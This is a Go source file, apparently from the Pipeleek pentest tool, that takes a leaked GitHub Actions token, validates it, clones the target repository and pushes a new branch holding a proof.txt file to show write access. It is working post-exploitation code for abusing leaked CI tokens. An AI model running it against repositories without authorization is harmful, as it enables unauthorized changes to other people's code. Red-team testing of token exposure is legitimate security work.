package exploit

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/go-git/go-git/v5"
	"github.com/go-git/go-git/v5/config"
	"github.com/go-git/go-git/v5/plumbing"
	"github.com/go-git/go-git/v5/plumbing/object"
	"github.com/go-git/go-git/v5/plumbing/transport/http"
	"github.com/google/go-github/v69/github"
	"github.com/rs/zerolog/log"
)

const (
	defaultCommitMessage = "Add ghtoken env dump job"
	branchPrefix         = "pipeleek-"
)

func Run(githubUrl, githubToken, repoPath string) {
	parts := strings.Split(repoPath, "/")
	if len(parts) != 2 {
		log.Fatal().Str("repo", repoPath).Msg("Repository must be in format owner/repo")
	}
	owner, repoName := parts[0], parts[1]

	ctx := context.Background()
	client := github.NewClient(nil).WithAuthToken(githubToken)
	if githubUrl != "" && githubUrl != "https://api.github.com" && githubUrl != "https://api.github.com/" {
		var err error
		client, err = client.WithEnterpriseURLs(githubUrl, githubUrl)
		if err != nil {
			log.Fatal().Stack().Err(err).Str("url", githubUrl).Msg("Failed to create GitHub client with enterprise URL")
		}
	}

	var (
		repo          *github.Repository
		resp          *github.Response
		err           error
		defaultBranch string
		cloneURL      string
	)
	repo, resp, err = client.Repositories.Get(ctx, owner, repoName)
	if err != nil {
		log.Fatal().Stack().Err(err).Int("status", resp.StatusCode).Str("repo", repoPath).Msg("Repo API access blocked your GITHUB_TOKEN might not be valid anymore")
	} else {
		log.Info().Msg("GitHub Actions token validation succeeded")
		log.Info().
			Str("repo", repo.GetFullName()).
			Str("visibility", repo.GetVisibility()).
			Str("default_branch", repo.GetDefaultBranch()).
			Msg("Repository information retrieved")

		defaultBranch = repo.GetDefaultBranch()
		cloneURL = repo.GetCloneURL()
	}

	log.Warn().Msg("GitHub Actions GITHUB_TOKEN has limited default permissions (usually read-only)")
	log.Warn().Msg("Check the workflow's permissions manually: https://docs.github.com/en/actions/security-for-github-actions/security-guides/automatic-token-authentication#permissions-for-the-github_token")

	branchName, err := generateBranchName()
	if err != nil {
		log.Fatal().Stack().Err(err).Msg("Failed to generate branch name")
	}

	if cloneURL == "" {
		log.Fatal().Msg("Repository clone URL is empty")
	}

	if err := attemptCloneAndPush(cloneURL, githubToken, defaultBranch, branchName, repoPath); err != nil {
		log.Warn().Stack().Err(err).Str("branch", branchName).Msg("Could not write to the repo with this token (check token permissions)")
		return
	}

	log.Info().Str("repo", *repo.HTMLURL).Str("branch", branchName).Msg("Successfully cloned and created branch with the GitHub Actions token")
	log.Info().Str("url", fmt.Sprintf("%s/tree/%s", *repo.HTMLURL, branchName)).Msg("Review branch changes")
}

func generateBranchName() (string, error) {
	randomBytes := make([]byte, 4)
	if _, err := rand.Read(randomBytes); err != nil {
		return "", err
	}

	return branchPrefix + hex.EncodeToString(randomBytes), nil
}

func attemptCloneAndPush(cloneURL, githubToken, defaultBranch, branchName, repoPath string) error {
	parentDir, err := os.MkdirTemp("", "pipeleek-ghtoken-")
	if err != nil {
		return err
	}

	cloneDir := filepath.Join(parentDir, "repo")
	auth := &http.BasicAuth{
		Username: "x-access-token",
		Password: githubToken,
	}

	log.Info().Str("repo", repoPath).Msg("Attempting to clone repository with token...")
	cloneOptions := &git.CloneOptions{
		URL:   cloneURL,
		Auth:  auth,
		Depth: 1,
	}

	if defaultBranch != "" {
		cloneOptions.SingleBranch = true
		cloneOptions.ReferenceName = plumbing.NewBranchReferenceName(defaultBranch)
	}

	repo, err := git.PlainClone(cloneDir, false, cloneOptions)
	if err != nil {
		return fmt.Errorf("failed to clone repository (token may lack read access): %w", err)
	}

	if defaultBranch == "" {
		head, headErr := repo.Head()
		if headErr == nil && head.Name().IsBranch() {
			defaultBranch = head.Name().Short()
		}
	}

	log.Info().Str("dir", cloneDir).Str("branch", defaultBranch).Msg("Successfully cloned repository")

	worktree, err := repo.Worktree()
	if err != nil {
		return err
	}

	if err := worktree.Checkout(&git.CheckoutOptions{
		Branch: plumbing.NewBranchReferenceName(branchName),
		Create: true,
	}); err != nil {
		return err
	}
	log.Debug().Str("branch", branchName).Msg("Checked out new branch")

	proofPath := filepath.Join(cloneDir, "proof.txt")
	proofContent := "Pipeleek demonstrated GitHub Actions token access üèÜ"

	if err := os.WriteFile(proofPath, []byte(proofContent), 0o600); err != nil {
		return fmt.Errorf("failed writing proof.txt: %w", err)
	}
	log.Debug().Str("path", proofPath).Msg("Wrote proof.txt")

	if _, err := worktree.Add("proof.txt"); err != nil {
		return err
	}
	log.Debug().Str("file", "proof.txt").Msg("Staged proof.txt")

	if _, err := worktree.Commit(defaultCommitMessage, &git.CommitOptions{
		Author: &object.Signature{
			Name:  "pipeleek",
			Email: "noreply@pipeleek.local",
			When:  time.Now(),
		},
	}); err != nil {
		return err
	}
	log.Debug().Str("message", defaultCommitMessage).Msg("Committed proof.txt")

	log.Info().Str("branch", branchName).Msg("Attempting to push branch (this tests write access)...")
	if err := repo.Push(&git.PushOptions{
		Auth: auth,
		RefSpecs: []config.RefSpec{
			config.RefSpec("refs/heads/" + branchName + ":refs/heads/" + branchName),
		},
	}); err != nil && err != git.NoErrAlreadyUpToDate {
		return fmt.Errorf("failed to push branch (token may lack write access): %w", err)
	}
	log.Debug().Str("branch", branchName).Msg("Pushed branch successfully")

	return nil
}
